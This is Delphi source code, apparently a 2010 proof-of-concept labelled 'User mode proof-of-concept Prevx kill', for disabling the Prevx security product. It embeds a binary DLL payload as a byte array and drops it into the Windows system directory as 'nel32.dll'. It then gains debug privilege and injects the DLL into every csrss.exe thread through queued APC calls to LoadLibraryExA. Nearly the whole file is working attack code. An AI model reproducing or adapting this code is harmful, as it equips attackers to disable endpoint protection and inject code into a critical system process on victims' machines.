    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $79, $03, $81, $3D, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00
    );

function ShowMessage(PStr: PWideChar; Buttons: DWORD): DWORD;
begin
  result := MessageBoxW(GetDesktopWindow(), PStr, 'UG North 2010 Fuzzers Pack', Buttons);
end;

function GetTargetProcessHandle(): THANDLE;
var
  attr: OBJECT_ATTRIBUTES;
  cid1: CLIENT_ID;
begin
  result := 0;
  cid1.UniqueProcess := CsrGetProcessId();
  cid1.UniqueThread := 0;
  InitializeObjectAttributes(@attr, nil, 0, 0, nil);
  if (ZwOpenProcess(@result, PROCESS_ALL_ACCESS, @attr, @cid1) <> STATUS_SUCCESS) then result := 0;
end;

function TargetIsRunning(): BOOLEAN; stdcall;
var
  str1: UNICODE_STRING;
  attr: OBJECT_ATTRIBUTES;
  id1: THANDLE;
begin
  result := false;
  RtlInitUnicodeString(@str1, '\??\pxscan');
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwOpenSymbolicLinkObject(@id1, SYMBOLIC_LINK_QUERY, @attr) = STATUS_SUCCESS) then
  begin
    result := true;
    ZwClose(id1);
  end;
end;

function WriteBufferToFile(const lpFileName: PWideChar; Buffer: pointer; Size: DWORD; Append: boolean = false): integer; stdcall;
var
  fh: THANDLE;
  ns: NTSTATUS;
  dwFlag: DWORD;
  fo1: LARGE_INTEGER;
  attr: OBJECT_ATTRIBUTES;
  str1: UNICODE_STRING;
  fs1: FILE_STANDARD_INFORMATION;
  iost: IO_STATUS_BLOCK;
begin
  iost.uInformation := 0;
  if (RtlDosPathNameToNtPathName_U(lpFileName, @str1, nil, nil)) then
  begin
    ns := FILE_WRITE_ACCESS or SYNCHRONIZE;
    dwFlag := FILE_OVERWRITE_IF;
    if Append then
    begin
      ns := ns or FILE_READ_ACCESS;
      dwFlag := FILE_OPEN_IF;
    end;
    InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
    ns := ZwCreateFile(@fh, ns, @attr,
      @iost, nil, FILE_ATTRIBUTE_NORMAL, 0, dwFlag,
      FILE_SYNCHRONOUS_IO_NONALERT or FILE_NON_DIRECTORY_FILE, nil, 0);
    if (ns = STATUS_SUCCESS) then
    begin
      if Append then
      begin
        if (ZwQueryInformationFile(fh, @iost, @fs1, sizeof(fs1), FileStandardInformation) = STATUS_SUCCESS) then fo1 := fs1.EndOfFile;
        ZwWriteFile(fh, 0, nil, nil, @iost, Buffer, Size, @fo1, nil);
      end else
        ZwWriteFile(fh, 0, nil, nil, @iost, Buffer, Size, nil, nil);
      ZwClose(fh);
    end;
    RtlFreeUnicodeString(@str1);
  end;
  result := iost.uInformation;
end;

function FindDataAddress(base: PChar): pointer;
var
  p: PChar;
  bFound: boolean;
  i: integer;
begin
  bfound := FALSE;

  p := base;

  i := 0;
  while (not bFound) do
  begin
    inc(i);
    if (i > $F8000) then break;

    if (ULONG(p) = $FFFFFFFF) then break;
    if ((p^ = 'N') and
      ((p + 1)^ = 'E') and
      ((p + 2)^ = 'L') and
      ((p + 3)^ = '3') and
      ((p + 4)^ = '2') and
      ((p + 5)^ = '.') and
      ((p + 6)^ = 'd') and
      ((p + 7)^ = 'l') and
      ((p + 8)^ = 'l') and
      ((p + 9)^ = #0)) then
    begin
      bFound := true;
      continue;
    end
    else
      inc(p);
  end;
  result := p;
end;

var
  tmp1: LBuf;

procedure TryToInjectCode();
var
  hThread, hLib: THANDLE;
  ProcAddress: DWORD;
  ernel32: PVOID;
  membuf: PChar;
  pp1: PSYSTEM_PROCESSES;
  pt1: PSYSTEM_THREADS;
  bytesIO, CsrProcessId: ULONG;
  i, u: integer;
begin
  CsrProcessId := CsrGetProcessId();
  hLib := GetModuleHandleW('kernel32.dll');
  if (hLib <> 0) then
  begin
    ProcAddress := DWORD(GetProcAddress(hLib, 'LoadLibraryExA'));
    if (ProcAddress <> 0) then
    begin
      ernel32 := FindDataAddress(PVOID(hLib));
      if (ernel32 = PVOID(hLib)) then exit;

      GetSystemDirectoryW(tmp1, MAX_PATH);
      strcatW(tmp1, '\nel32.dll');
      u := WriteBufferToFile(tmp1, @data, sizeof(data), false);
      if (u = 0) then exit;

      bytesIO := (1024 * 1024) * 4;
      membuf := mmalloc(bytesIO, true);
      if (membuf <> nil) then
      begin

        if (ZwQuerySystemInformation(SystemProcessesAndThreadsInformation, membuf, bytesIO, @bytesIO) = STATUS_SUCCESS) then
        begin
          pp1 := PSYSTEM_PROCESSES(membuf);
          while (1 = 1) do
          begin
            if (pp1^.ProcessId = CsrProcessId) then
            begin

              pt1 := PSYSTEM_THREADS(@pp1^.Threads);
              i := 0;
              u := pp1.ThreadCount;

              while (i < u) do
              begin
                InitializeObjectAttributes(@attr, nil, 0, 0);
                cid.UniqueProcess := pp1^.ProcessId;
                cid.UniqueThread := pt1^.ClientId.UniqueThread;
                if (ZwOpenThread(@hThread, THREAD_ALL_ACCESS, @attr, @cid) = STATUS_SUCCESS) then
                begin
                  ZwQueueApcThread(hThread, PVOID(ProcAddress), ernel32, @iost, 0);
                  ZwClose(hThread);
                end;
                inc(i);
                pt1 := PSYSTEM_THREADS(PChar(pt1) + sizeof(_SYSTEM_THREADS));
              end;
            end;
            if (pp1^.NextEntryOffset = 0) then break;
            pp1 := PSYSTEM_PROCESSES(PChar(pp1) + pp1^.NextEntryOffset);
          end;
        end;
      end;
      mmfree(membuf);
    end;
  end;
end;

const
  String6: PWideChar = '\BaseNamedObjects\prevxfuck';

var
  osver: OSVERSIONINFOEXW;
  hCsrss: THANDLE;
  str1: UNICODE_STRING;
  EventHandle: THANDLE;
begin
  osver.old.dwOSVersionInfoSize := sizeof(osver.old);
  RtlGetVersion(@osver);
  if (osver.old.dwBuildNumber > 2666) then exit;

  if (MessageBoxW(GetDesktopWindow(), 'User mode proof-of-concept Prevx kill'#13#10 +
    'Fucking (whatever) will not help Prevx!'#13#13#10 +
    'Yes to continue, No to exit program'#13#10 +
    '(c) 2010 by EP_X0FF', Title, MB_YESNO) = IDNO) then exit;

  if (TargetIsRunning()) then
  begin
    if (Internal_AdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE) = STATUS_SUCCESS) then
    begin
      hCsrss := GetTargetProcessHandle();
      EventHandle := 0;
      RtlInitUnicodeString(@str1, String6);
      InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
      ZwCreateEvent(@EventHandle, EVENT_ALL_ACCESS, @attr, NotificationEvent, FALSE);
      if (EventHandle = 0) then
      begin
        ZwOpenEvent(@EventHandle, EVENT_ALL_ACCESS, @attr);
      end;

      if (EventHandle <> 0) then
      begin
        if (hCsrss <> 0) then TryToInjectCode();
        if (ZwWaitForSingleObject(EventHandle, false, nil) = 0) then
          ShowMessage('Target successfully fucked, say bye-bye :)', MB_ICONINFORMATION);

        ZwClose(EventHandle);
      end;

    end;
  end else ShowMessage('Crap not found, try again', MB_ICONINFORMATION);
  ZwTerminateProcess(NtCurrentProcess, 0);
end.
